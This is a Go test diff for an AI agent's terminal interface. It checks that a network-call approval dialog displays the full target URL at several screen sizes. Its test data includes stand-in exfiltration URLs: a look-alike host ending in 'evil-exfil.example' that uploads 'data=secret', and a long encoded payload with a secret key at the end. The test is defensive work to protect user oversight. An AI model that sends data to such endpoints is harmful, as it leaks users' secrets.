@@ -93,6 +93,50 @@ func TestSteerAndPlanPickersFitAlongsideTheRunFooter(t *testing.T) {
 	}
 }
 
+// previewText joins the preview rows of an approval dialog (the indented
+// rows under the summary) with their indentation removed, so a URL wrapped
+// across rows can be searched as one string.
+func previewText(frame string) string {
+	var b strings.Builder
+	for _, row := range strings.Split(ansi.Strip(frame), "\n") {
+		row = strings.Trim(row, " │")
+		b.WriteString(row)
+	}
+	return b.String()
+}
+
+// A network approval shows the whole target: a query string that carries
+// data out, or the real domain at the end of a long host name, is exactly
+// what the user has to see before allowing the call.
+func TestNetworkApprovalShowsTheWholeTarget(t *testing.T) {
+	shortish := "https://docs.python.org.library.functions.reference.manual.section.evil-exfil.example/upload?data=secret"
+	long := "https://example.com/upload?payload=" + strings.Repeat("c2VjcmV0", 40) + "&key=SECRETTAIL"
+	for _, tc := range []struct {
+		target string
+		want   []string
+	}{
+		{shortish, []string{"evil-exfil.example", "data=secret"}},
+		{long, []string{"key=SECRETTAIL"}},
+	} {
+		for _, toolID := range []string{"web-fetch", "download", "mcp-read-resource", "some-network-tool"} {
+			req := agent.ShellApprovalRequest{ToolID: toolID, Command: "network " + toolID + " " + tc.target}
+			for _, size := range [][2]int{{200, 50}, {80, 40}} {
+				m := approvalModel(size[0], size[1], req)
+				m.approvalPreviewExpanded = true
+				m = m.recalcLayout()
+				frame := m.View().Content
+				assertFrameFits(t, "network approval", frame, size[0], size[1])
+				joined := previewText(frame)
+				for _, want := range tc.want {
+					if !strings.Contains(joined, want) {
+						t.Fatalf("%s at %v: %q is not on screen:\n%s", toolID, size, want, ansi.Strip(frame))
+					}
+				}
+			}
+		}
+	}
+}
+
 // The slash-command overlay leaves room for the input box as drawn, an
 // attachment chip included.
 func TestCommandOverlayFitsWithAnAttachment(t *testing.T) {
